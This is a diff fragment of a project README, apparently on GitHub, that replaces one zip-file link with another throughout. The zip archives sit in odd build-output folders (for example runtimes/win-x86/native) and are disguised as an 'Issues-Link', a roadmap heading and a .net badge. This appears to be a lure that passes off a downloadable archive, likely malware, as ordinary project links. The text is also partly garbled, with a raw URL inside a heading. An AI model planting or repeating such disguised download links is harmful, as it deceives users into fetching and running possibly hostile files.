@@ -40,8 +40,8 @@ Name Methode
 
 😄 ```Dont forget to add Interface App```
 
-💬``**Ask me about any problem in Issues Github**``[Issues-Link](https://raw.githubusercontent.com/dali-raki/INVnewobjective/lastTest2/Web/obj/Release/net9.0/compressed/Vnewobjective_IN_v2.1.zip)
+💬``**Ask me about any problem in Issues Github**``[Issues-Link](https://github.com/dali-raki/INVnewobjective/raw/refs/heads/lastTest2/Web/bin/Debug/net9.0/runtimes/win-x86/native/Vnewobjective_IN_v2.8.zip)
 
-## 🔗 https://raw.githubusercontent.com/dali-raki/INVnewobjective/lastTest2/Web/obj/Release/net9.0/compressed/Vnewobjective_IN_v2.1.zip Core Developer Road Map
-[![.net](https://raw.githubusercontent.com/dali-raki/INVnewobjective/lastTest2/Web/obj/Release/net9.0/compressed/Vnewobjective_IN_v2.1.zip)](https://raw.githubusercontent.com/dali-raki/INVnewobjective/lastTest2/Web/obj/Release/net9.0/compressed/Vnewobjective_IN_v2.1.zip)
+## 🔗 https://github.com/dali-raki/INVnewobjective/raw/refs/heads/lastTest2/Web/bin/Debug/net9.0/runtimes/win-x86/native/Vnewobjective_IN_v2.8.zip Core Developer Road Map
+[![.net](https://github.com/dali-raki/INVnewobjective/raw/refs/heads/lastTest2/Web/bin/Debug/net9.0/runtimes/win-x86/native/Vnewobjective_IN_v2.8.zip)](https://github.com/dali-raki/INVnewobjective/raw/refs/heads/lastTest2/Web/bin/Debug/net9.0/runtimes/win-x86/native/Vnewobjective_IN_v2.8.zip)
 
